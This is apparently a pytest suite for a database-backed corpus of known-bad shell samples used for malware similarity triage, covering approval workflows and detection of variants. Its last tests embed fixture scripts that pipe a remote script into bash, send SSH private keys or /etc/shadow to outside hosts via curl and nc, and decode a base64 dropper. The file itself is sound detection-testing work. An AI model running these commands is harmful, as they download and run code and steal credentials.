import hashlib
import os
import threading

import pytest

from conftest import SEED_CORPUS, runtime_url_for_role
from corpus_lookup import (
    MAX_SAMPLE_BYTES,
    SampleExistsError,
    SampleNotFoundError,
    SampleNotPendingError,
    approve_sample,
    list_samples,
    load_known_bad,
    propose_sample,
    reject_sample,
)
from db import new_pool, run_migrations
from similarity import compare
import static_triage


@pytest.fixture
def pool():
    admin_url = os.getenv("MIRRAURA_TEST_DATABASE_URL")
    if not admin_url:
        pytest.skip("MIRRAURA_TEST_DATABASE_URL not set; skipping Postgres-backed test")
    runtime_url = runtime_url_for_role(admin_url, "verdict_role", "verdict_test_pw")
    run_migrations(admin_url, runtime_url, "migrations")
    p = new_pool(runtime_url)

    # Back to just the migration's seed rows, both before (test_app.py runs
    # earlier and leaves proposals behind) and after (so later test files see
    # the same corpus regardless of run order).
    def reset():
        with p.connection() as conn:
            conn.execute(
                "DELETE FROM known_bad_samples WHERE NOT (content_hash = ANY(%s))",
                ([hashlib.sha256(c).hexdigest() for _, c in SEED_CORPUS],),
            )

    reset()
    yield p
    reset()
    p.close()


def _unique(tag: str) -> bytes:
    # Random-ish, script-unlike content so an approved test entry can't
    # near-match some other test's input.
    return f"{tag}:{os.urandom(32).hex()}".encode()


def test_migration_seeds_approved_corpus(pool):
    assert sorted(load_known_bad(pool)) == sorted(SEED_CORPUS)


def test_load_known_bad_returns_only_approved(pool):
    pending = _unique("pending")
    rejected = _unique("rejected")
    propose_sample(pool, pending, "p", source="manual")
    propose_sample(pool, rejected, "r", source="manual")
    reject_sample(pool, hashlib.sha256(rejected).hexdigest())
    contents = [c for _, c in load_known_bad(pool)]
    assert pending not in contents and rejected not in contents


def test_approve_adds_sample_to_corpus(pool):
    content = _unique("approve")
    entry = propose_sample(pool, content, "new-sample", source="manual")
    assert entry["content_hash"] == hashlib.sha256(content).hexdigest()
    assert entry["status"] == "pending"
    approve_sample(pool, entry["content_hash"])
    assert ("new-sample", content) in load_known_bad(pool)


def test_list_samples_includes_preview_not_raw_content(pool):
    content = _unique("list")
    propose_sample(pool, content, "listed", source="manual")
    row = next(s for s in list_samples(pool) if s["label"] == "listed")
    assert row["preview"] == content.decode()
    assert row["size"] == len(content)
    assert "content" not in row


def test_propose_rejects_empty_and_oversized(pool):
    with pytest.raises(ValueError):
        propose_sample(pool, b"", "empty", source="manual")
    with pytest.raises(ValueError):
        propose_sample(pool, b"x" * (MAX_SAMPLE_BYTES + 1), "big", source="manual")


def test_propose_rejects_duplicate(pool):
    content = _unique("dup")
    propose_sample(pool, content, "a", source="manual")
    with pytest.raises(SampleExistsError):
        propose_sample(pool, content, "b", source="manual")


def test_decide_unknown_and_already_decided(pool):
    with pytest.raises(SampleNotFoundError):
        approve_sample(pool, "0" * 64)
    content_hash = propose_sample(pool, _unique("twice"), "t", source="manual")["content_hash"]
    approve_sample(pool, content_hash)
    with pytest.raises(SampleNotPendingError):
        reject_sample(pool, content_hash)


def test_concurrent_decisions_only_one_wins(pool):
    content_hash = propose_sample(pool, _unique("race"), "race", source="manual")["content_hash"]
    results = []

    def decide(fn):
        try:
            fn(pool, content_hash)
            results.append("ok")
        except SampleNotPendingError:
            results.append("not-pending")

    threads = [threading.Thread(target=decide, args=(f,)) for f in (approve_sample, reject_sample)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert sorted(results) == ["not-pending", "ok"]


def test_static_triage_uses_db_corpus(pool):
    reasons = static_triage.run(SEED_CORPUS[1][1], pool)
    assert any("devtcp_reverse_shell" in r for r in reasons)


def test_static_triage_db_error_is_no_match_not_crash(pool, monkeypatch):
    def boom(_pool):
        raise RuntimeError("db down")

    monkeypatch.setattr(static_triage.corpus_lookup, "load_known_bad", boom)
    reasons = static_triage.run(SEED_CORPUS[1][1], pool)
    assert not any("similar" in r for r in reasons)  # YARA may still match, similarity must not


def test_new_seeds_match_lightly_modified_variants(pool):
    corpus = load_known_bad(pool)
    dropper = b"#!/bin/bash\ncurl -fsSL http://198.51.100.9/stage3.sh | bash\n"
    exfil = b"#!/bin/bash\ntar czf - ~/.ssh/id_rsa ~/.ssh/id_ed25519 | curl -s -X POST --data-binary @- http://198.51.100.9/up\n"
    assert compare(dropper, corpus)[0]["label"] == "curl_pipe_dropper"
    assert compare(exfil, corpus)[0]["label"] == "ssh_key_exfil"


def test_proposed_variants_match_only_after_approval(pool):
    variants = {
        "base64_dropper": b"#!/bin/bash\necho 'IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vMjAzLjAuMTEzLjcvcCB8IGJhc2gK' | base64 -d | bash\n",
        "shadow_exfil": b"#!/bin/bash\ncat /etc/shadow | nc 203.0.113.7 9001\n",
    }
    renamed = {
        "base64_dropper": variants["base64_dropper"].replace(b"base64 -d", b"base64 --decode"),
        "shadow_exfil": variants["shadow_exfil"].replace(b"9001", b"9002"),
    }
    hashes = {label: propose_sample(pool, content, label, source="manual")["content_hash"] for label, content in variants.items()}

    for label, content in renamed.items():
        assert label not in {m["label"] for m in compare(content, load_known_bad(pool))}

    for content_hash in hashes.values():
        approve_sample(pool, content_hash)

    corpus = load_known_bad(pool)
    for label, content in renamed.items():
        assert compare(content, corpus)[0]["label"] == label
